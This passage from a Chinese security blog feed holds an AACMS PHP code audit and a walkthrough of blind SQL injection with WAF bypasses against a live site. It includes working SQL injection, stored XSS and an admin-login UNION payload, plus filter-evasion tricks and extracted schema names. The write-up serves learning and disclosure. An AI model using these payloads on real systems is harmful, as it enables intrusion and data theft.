class="hljs-variable">$title</span>,<br><span class="hljs-string">&#x27;displayorder&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br><span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-variable">$url</span><br>));<br><br>cpmsg(<span class="hljs-string">&#x27;custommenu_add_succeed&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;succeed&#x27;</span>);<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>cpmsg(<span class="hljs-string">&#x27;parameters_error&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>构造<code>url:http://192.168.0.103/aacms28/admin.php?action=misc&amp;operation=custommenu_add&amp;url=456&amp;title=1%2527%20or%20updatexml(1,concat(0x7e,user()),1)%23</code></p><p>需要注意的是，这里的注释符不能直接输入，需要将其进行url编码后再传入</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/10.png"></p><h6 id="2-二次注入漏洞"><a href="#2-二次注入漏洞" class="headerlink" title="2.二次注入漏洞"></a>2.二次注入漏洞</h6><p>再回来看刚刚的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;custommenu_add&#x27;</span>) &#123;      <span class="hljs-comment">// 浏览器在向web应用传参时会进行一次url解码</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) &#123;        <span class="hljs-comment">// 不为空则进入</span><br><br><span class="hljs-variable">$title</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);     <span class="hljs-comment">// url再次解码，导致可以直接绕过魔术引号</span><br><span class="hljs-variable">$url</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(DB::getOne(<span class="hljs-string">&quot;SELECT id FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>).<span class="hljs-string">&quot; WHERE title=&#x27;<span class="hljs-subst">$title</span>&#x27;&quot;</span>)) &#123;<br>cpmsg(<span class="hljs-string">&#x27;custommenu_duplicate&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br>DB::insert(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>, <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&#x27;title&#x27;</span> =&gt; <span class="hljs-variable">$title</span>,<span class="hljs-comment">// 直接向数据库中插入title</span><br><span class="hljs-string">&#x27;displayorder&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br><span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-variable">$url</span><br>));<br><br>cpmsg(<span class="hljs-string">&#x27;custommenu_add_succeed&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;succeed&#x27;</span>);<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>cpmsg(<span class="hljs-string">&#x27;parameters_error&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>能够发现，下面还有一条插入语句，由于魔术引号已经被绕过了，所以这里也利用一下</p><p>先看一下正常插入时，数据库的执行情况，执行<code>title=1&amp;url=2</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">QueryDESC pre_admincp_menu<br>QueryINSERT INTO pre_admincp_menu (`title`, `url`, `displayorder`) VALUES (&#x27;1&#x27;, &#x27;2&#x27;, &#x27;0&#x27;)<br></code></pre></td></tr></table></figure><p>看到这里就可以进行payload的构造了</p><p>由于上面有<code>DB::getOne(&quot;SELECT id FROM &quot;.DB::table(&#39;admincp_menu&#39;).&quot; WHERE title=&#39;$title&#39;&quot;)</code></p><p>这里对title进行了一个查询，如果将payload插入到title位置，那么将会直接导致这条sql语句无法正常执行，然后程序报错停止，所以只能将payload插入到url位置</p><p>构造<code>payload:</code> <code>title=1&amp;url=1%2527,1),(user(),1,2)%23</code></p><p>或是：<code>title=1&amp;url=1%2527,0),(2,user(),1)%23</code>，都能够实现</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/11.png"></p><p>当然，这里其实不用看代码都能够发现，大概率存在存储型的跨站</p><p><code>payload:</code> <code>title=&lt;img src=1 onerror=alert(1)&gt;&amp;url=1</code>需要进行url编码</p><p><code>payload:</code> <code>title=%3c%69%6d%67%20%73%72%63%3d%31%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e&amp;url=1</code></p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/12.png"></p><h6 id="3-XSS漏洞"><a href="#3-XSS漏洞" class="headerlink" title="3.XSS漏洞"></a>3.XSS漏洞</h6><p>先跟着大佬的思路走</p><p>回到admin_misc.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;custommenu&#x27;</span>) &#123;<br><br><span class="hljs-variable">$optionlist</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$query</span> = DB::query(<span class="hljs-string">&quot;SELECT * FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>).<span class="hljs-string">&quot; ORDER BY displayorder&quot;</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$custom</span> = DB::fetch(<span class="hljs-variable">$query</span>)) &#123;<br><span class="hljs-variable">$custom</span>[<span class="hljs-string">&#x27;url&#x27;</span>] = rawurldecode(<span class="hljs-variable">$custom</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-variable">$optionlist</span> .= showtablerow(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;class=&quot;td25&quot;&#x27;</span>, <span class="hljs-string">&#x27;class=&quot;td28&quot;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;class=&quot;td26&quot;&#x27;</span>), <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&quot;&lt;input type=\&quot;checkbox\&quot; class=\&quot;checkbox\&quot; name=\&quot;delete[]\&quot; value=\&quot;<span class="hljs-subst">$custom</span>[id]\&quot;&gt;&quot;</span>,<br><span class="hljs-string">&quot;&lt;input type=\&quot;text\&quot; class=\&quot;txt\&quot; size=\&quot;3\&quot; name=\&quot;displayorder[<span class="hljs-subst">$custom</span>[id]]\&quot; value=\&quot;<span class="hljs-subst">$custom</span>[displayorder]\&quot;&gt;&quot;</span>,<br><span class="hljs-string">&quot;&lt;input type=\&quot;text\&quot; class=\&quot;txt\&quot; size=\&quot;25\&quot; name=\&quot;title[<span class="hljs-subst">$custom</span>[id]]\&quot; value=\&quot;&quot;</span>.cplang(<span class="hljs-variable">$custom</span>[<span class="hljs-string">&#x27;title&#x27;</span>]).<span class="hljs-string">&quot;\&quot;&gt;&quot;</span>,<br><span class="hljs-string">&quot;&lt;input type=\&quot;text\&quot; class=\&quot;txt\&quot; size=\&quot;40\&quot; name=\&quot;url[<span class="hljs-subst">$custom</span>[id]]\&quot; value=\&quot;<span class="hljs-subst">$custom</span>[url]\&quot;&gt;&quot;</span><br>), <span class="hljs-literal">TRUE</span>);<br>&#125;<br><br><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;misc_custommenu&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>在前面的通读中，已知该系统并没有对XSS进行相关校验，而就算输入经过<code>addslashes()</code>过滤，也并不会影响前段HTML标签的加载，所以上述代码中<code>$custom[url]</code>和<code>$custom[&#39;title&#39;]</code>都可能存在XSS漏洞</p><p>根据前段页面的情况构造payload</p><p><code>url=&quot; onclick=&quot;alert(1)</code></p><p><code>title=&quot; onclick=&quot;alert(1)</code></p><p>需要进行url编码后发送</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/14.png"></p><p>但这里的，如果测试XSS漏洞的话，可能黑盒会更快一些，因为已经知道了web应用没有对XSS进行一个校验，所以能插入的地方，就使劲插入payload，白盒可以少一些。</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/13.png"></p><h5 id="无法复现的漏洞"><a href="#无法复现的漏洞" class="headerlink" title="无法复现的漏洞"></a>无法复现的漏洞</h5><h6 id="1-登录位置的宽字节注入"><a href="#1-登录位置的宽字节注入" class="headerlink" title="1.登录位置的宽字节注入"></a>1.登录位置的宽字节注入</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;login&#x27;</span>) &#123;<br><br><span class="hljs-keyword">if</span>(submitcheck(<span class="hljs-string">&#x27;loginsubmit&#x27;</span>)) &#123;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_password&#x27;</span>];<br><br><span class="hljs-variable">$member</span> = DB::getRow(<span class="hljs-string">&quot;SELECT * FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;member&#x27;</span>).<span class="hljs-string">&quot; WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$password</span> = md5(md5(<span class="hljs-variable">$password</span>).<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;salt&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span> == <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &amp;&amp; <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;uid&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] ? unserialize(<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br>dheader(ADMINSCRIPT);<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><br>@<span class="hljs-keyword">include_once</span> ROOT.<span class="hljs-string">&#x27;./source/aacms_version.php&#x27;</span>;<br><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;member_login&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>$username</code>直接拼接进查询语句，由于数据库编码为GBK，所以存在宽字节注入，插入payload之后，数据库执行日志如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">QuerySELECT * FROM pre_member WHERE username=&#x27;admin運&#x27; or updatexml(1,concat(1,user()),1)#&#x27;<br># 将该语句代入数据库中进行执行，发现是能够成功执行的，而该web应用没有返回数据库报错信息，直接301，所以使用报错注入无法实现，猜测是这里没有开启报错信息<br># 使用时间盲注，发现无法进行延时，数据库最终执行的payload可以进行延迟，未发现原因<br># 堆叠注入同样无法进行<br></code></pre></td></tr></table></figure><h6 id="2-后台万能密码登录"><a href="#2-后台万能密码登录" class="headerlink" title="2.后台万能密码登录"></a>2.后台万能密码登录</h6><p>还是上面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;login&#x27;</span>) &#123;<br><br><span class="hljs-keyword">if</span>(submitcheck(<span class="hljs-string">&#x27;loginsubmit&#x27;</span>)) &#123;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_password&#x27;</span>];<br><br><span class="hljs-variable">$member</span> = DB::getRow(<span class="hljs-string">&quot;SELECT * FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;member&#x27;</span>).<span class="hljs-string">&quot; WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$password</span> = md5(md5(<span class="hljs-variable">$password</span>).<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;salt&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span> == <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &amp;&amp; <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;uid&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] ? unserialize(<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br>dheader(ADMINSCRIPT);<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><br>@<span class="hljs-keyword">include_once</span> ROOT.<span class="hljs-string">&#x27;./source/aacms_version.php&#x27;</span>;<br><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;member_login&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>当用户的密码解不出来时，上面的宽字节注入漏洞就显得没多大用了，所以一个万能密码是很重要的，这里由于没有复现成功，所以就自己捋一下思路吧，为下次碰见类似做个准备</p><p>首先程序根据<code>$username</code>字段去数据库中查取响应的账号信息</p><p>然后对输入的密码进行一个加盐加密</p><p>比对密码同时判断该账号是否为管理员</p><p>OK，由于在根据<code>$username</code>去数据库查询处存在sql注入，所以，可以通过使用联合查询覆盖掉原来的查询数据，让数据库返回想要的数据</p><p>根据数据库的字段，可以进行payload的构造</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/19.png"></p><p><code>&amp;admin_username=zzz%df&#39; UNION SELECT 1,2,0x6433356536363866373765653433326661646534396637643763666436616434,4,1,6,7,8,9,10,11,12,13 -- &amp;admin_password=3</code></p><p>其中字段三为数据库加密后的密码，字段五<code>groupid</code>必须为1，字段九<code>salt</code>用于字段三加密</p><p>数据库最终执行语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM pre_member WHERE username=&#x27;zzz運&#x27; UNION SELECT 1,2,0x6433356536363866373765653433326661646534396637643763666436616434,4,1,6,7,8,9,10,11,12,13 -- &#x27;<br></code></pre></td></tr></table></figure><p>代入数据库查询，返回的也是想要的值</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/20.png"></p><p>但就是无法成功复现，原因仍未发现😭</p><p>真菜，复现都复现不出来😒</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.freebuf.com/vuls/229981.html">https://www.freebuf.com/vuls/229981.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>PHP代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>小破站的SQL绕过</title>
    <link href="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/"/>
    <url>/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这篇文章中的站点是以前发现的了，漏洞也是以前搞的，但是最近我觉着我大哥需要找点东西练练手，然后就把这个丢给了大哥，结果大哥总是在找理由推脱（大哥也想搞，但总是找借口说没时间），然后我跟大哥说，你再不搞我就直接把思路过程发给你，恶心大哥一手。没错，这篇文章就是拿来恶心我大哥一手的</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/1.png"></p><h4 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h4><p>这个站点好像是补天公益里面的一个，至于注入点是怎么找到的就记不清了，所以就直接开搞</p><p><code>and 1=1</code>，<code>and 1=2</code>,屡试不爽,结果GG，直接白屏啥都不显示好吧</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/2.png"></p><p>and不行，那就试一下or，好家伙，也是不行，但是试一下直接<code>video_id=0 or 1</code>，因为1也是代表TRUE，不错，不错  可行，注意此时页面在会务小程序处反回了很多小视频</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/3.png"></p><p>再试一下<code>video_id=0 or 0</code>，小视频没了，这基本可以确定布尔盲注没跑了</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/4.png"></p><p>后面发现直接<code>video_id=0</code>和<code>video_id=1</code>也是能发现页面回显不一样的，那这里肯定要试一下报错</p><p>既然是布尔盲注，那肯定要先判断一下database()的长度，不过这是问题就来了，一般布尔盲注肯定优先用if，</p><p>直接尝试<code>video_id=0 or if(length(database())=10,1,0)</code></p><p>直接报错</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/5.png"></p><p>好家伙，直接报错，显示<code>())=1010</code>位置错误，而输入的是<code>if(length(database())=10,1,0)</code>,能够判断逗号 <strong>,</strong> 逗号无了，而if必须要使用逗号(在我的认知中是必须要使用逗号的)，作为菜鸡的我，一时间不知道该如何了。但这里需要记一下，逗号被过滤掉了，后面绕过过程中会用到</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/6.png"></p><p>拿出我的MySQL手册，打开，翻找，发现我真菜，能就只有一个if嘛？？？肯定还有其他的判断语句，果不其然，有<code>when</code>,而且<code>when</code>还没有逗号，完美</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># when语句用法 condition是一个返回布尔类型的表达式，如果表达式返回true，则整个函数返回相应result的值，如果表达式皆为false，则返回ElSE后result的值，如果省略了ELSE子句，则返回NULL。<br>CASE WHEN condition THEN result<br>[WHEN...THEN...]<br>ELSE result<br>END<br></code></pre></td></tr></table></figure><p>尝试一下<code>video_id=0 or (case when 1=2 then 1 else 0 end)</code>和<code>video_id=0 or (case when 1=1 then 1 else 0 end)</code></p><p>发现页面已经不报错了，并且返回内容也不相同，这样可以继续往下了</p><p>再试一下<code>video_id=0 or (case when length(database())=10 then 1 else 0 end)</code>,好了，又不行</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/7.png"></p><p>看来这里不是<code>length()</code>，就是<code>database()</code>的问题了</p><p>先试一下<code>length()</code>能不能使用，<code>video_id=0 or (case when length(123)=3 then 1 else 0 end)</code>，</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/8.png"></p><p>发现能用，那肯定是对<code>database()</code>进行了检测过滤</p><p>那输入<code>video_id=0 or (case when length(zzzdataqqqbasexxx())=3 then 1 else 0 end)</code>来试一下，好家伙该有的基本没有，不该有的都有，但注意<code>database()</code>中的<code>base</code>被过滤掉了.（其实这里已经得到<code>database()</code>的值了，但这里是讲绕过，所以继续绕）</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/9.png"></p><p><code>base</code>无了，那我写两个好吧，<code>video_id=0 or (case when length(datababasese())=8 then 1 else 0 end)</code></p><p>成功，这就很nice了，得到<code>database()</code>的长度为8</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/10.png"></p><p>开始爆数据库名，这里先尝试一下能否使用引号：<code>video_id=0 or (case when length(&#39;123&#39;)=3 then 1 else 0 end)</code></p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/11.png"></p><p>算了，还是不用引号了吧，用<code>ascii()</code>这个函数，但是要记住的是这里不能使用逗号，引号</p><p>而刚好<code>substring()</code>有一种不用引号的形式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">substring(string from position for length)<br># 参数string指的是需要截取的原字符串<br># 数position指的是从哪个位置开始截取子字符串,若position为负数则从右往左开始数位置。<br># 参数length指的是需要截取的字符串长度，如果不写，则默认截取从position开始到最后一位的所有字符。<br></code></pre></td></tr></table></figure><p>这里是一位一位判断的，所以可以忽略for，构造payload如下</p><p><code>video_id=0 or (case when ascii(substring(datababasese() from -1))=121 then 1 else 0 end)</code></p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/12.png"></p><p>成功获取到数据库名的最后一位是<strong>y</strong>，然后就一步步获取就可以了，最终得到数据库名为：<strong>news_wsy</strong>，与上面看到的一样</p><p>接下来就是获取表名了，正常情况下直接把<code>datababasese()</code>换成<code>(select table_name from information_schema.tables where table_schema=&quot;数据库名&quot;)</code>就可以了，但这里肯定不正常0.0</p><p>不能有引号：所以可以利用MySQL的特性将库名位置更改为16进制形式：0x6E6577735F777379</p><p><code>video_id=0 or not (case when substring((select table_name from information_schema.tables where table_schema=0x6E6577735F777379)from 1 for 1)=0x61 then 1 else0 end)</code>,尝试一下这个payload</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/13.png"></p><p>GG,直接参数不合法，参数不合法，那测一下哪些参数不合法</p><p>先试一下select合不合法，因为这个是很多过滤规则中都会禁用的</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/14.png"></p><p>果然不合法，像这种关键字一般可以使用内联注释、关键字替代、大小写等绕过方式，但这里，还可以使用逗号，在前面的绕过中发现逗号是会被过滤掉的，所以这里可以尝试一下在select中加个逗号，如果服务端是先进行select的检验，再删除逗号，那么这里就是可以行的，尝试之后，发现能够成功过来</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/15.png"></p><p>然后继续往下尝试，一个单词一个单词的进行，看看服务端还检测了哪些，</p><p>写到<code>video_id=0 or not (case when substring((sel,ect table_name from information_schema.tables)from 1 for 1)=0x61 then 1 else 0 end)</code>这里时发现又不行了，又提示参数不合法了</p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/16.png"></p><p>那基本上就是<code>information_schema.tables</code>的问题，经测试<code>information_schema</code>和<code>tables</code>单独存在时都没有问题，那么一定是<code>information_schema.tables</code>同时存在会被规则匹配到，那么这里可以更改成<code>informa,tion_sch,ema.tab,les</code>或者<code>information_schema . tables</code>(这种形式是在MySQL命令行中测试发现)，将payload更改为如下形式：</p><p><code>video_id=0 or not (case when substring((sel,ect group_concat(table_name)from information_schema . tables where table_schema=0x6E6577735F777379)from 1 for 1)=0x61 then 1 else 0 end)</code></p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/17.png"></p><p>成功，接下来就是繁琐的爆表，这里获取了前四个表的：addgunang,admin,announcement_list，获取表之后就是爆字段了，这里跟爆表没有太多区别，所以直接附上payload:</p><p><code>video_id=0 or not(case when substring((sel,ect group_concat(column_name)from(information_schema . columns)where table_name=0x61646D696E)from 1 for 1)=0x61 then 1 else 0 end)</code></p><p><img src="/2022/02/12/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/18.png"></p><p>成功，获取数据处基本上就没有什么绕过的内容了，所以写到这里就差不多了</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>其实这个注入点是很简单的，尤其是在发现服务端将逗号过滤掉之后，并且这个过滤逗号是在检测之后进行的，发现这个之后，后面注入基本上没有什么问题，遇到关键字检测就在关键字中加个逗号，这样就能绕过检测；另外就是MySQL中一些可以相互替换的函数，力推MySQL手册，看看这个找一找，有时候找官方文档比百度的快，基本上就这个样子了。另外文章中有一些Payload是直接复制的以前注入时留下的记录，所以可能有时候是<code>0 or 